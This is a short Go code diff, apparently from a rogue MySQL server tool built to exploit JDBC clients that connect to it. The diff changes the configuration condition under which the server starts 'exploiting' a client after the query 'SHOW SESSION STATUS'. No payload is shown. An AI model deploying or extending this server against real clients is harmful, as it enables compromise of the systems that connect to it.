@@ -188,7 +188,7 @@ func (db *DB) ComQuery(c *mysql.Conn, query string, callback func(*sqltypes.Resu
     log.Infof("Client from addr [%s], ID [%d] try to query [%s]", c.RemoteAddr(), c.ConnectionID, query)
 
     // JDBC client exploit
-    if (c.IsJdbcClient && db.config.JdbcExploit) || db.config.AlwaysExploit {
+    if db.config.JdbcExploit && (db.config.AlwaysExploit || c.IsJdbcClient) {
         if query == "SHOW SESSION STATUS" {
             log.Infof("Client request `SESSION STATUS`, start exploiting...")
             r := &sqltypes.Result{Fields: schemaToFields(Schema{
